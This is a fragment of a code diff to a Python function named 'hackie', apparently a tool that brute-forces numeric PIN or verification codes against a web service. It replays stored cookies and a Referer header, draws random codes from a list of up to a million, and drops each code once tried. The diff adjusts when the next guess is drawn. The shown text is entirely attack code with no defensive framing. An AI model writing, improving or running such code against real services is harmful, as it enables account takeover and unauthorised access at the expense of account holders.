@@ -198,9 +198,9 @@ def hackie(arg):
   cookie = json.loads(open("cookies.json", "r").read())
   header['Referer']=open("cach.txt", "r").read()
   url = open("cach.txt", "r").read()
+  pin =random.choice(codelist)
   while bool(RUN) == True:
     try:
-      pin = random.choice(codelist)
       if len(codelist) == 1000000:
         pass
       else:
@@ -224,9 +224,9 @@ def hackie(arg):
       else:
         body, url = elsi(web, body)
         header['Referer'] = web.url
-        cookie = session.cookies.get_dict()
         try:
           codelist.remove(str(pin))
+          pin = random.choice(codelist)
         except:
           pass
         total+=1
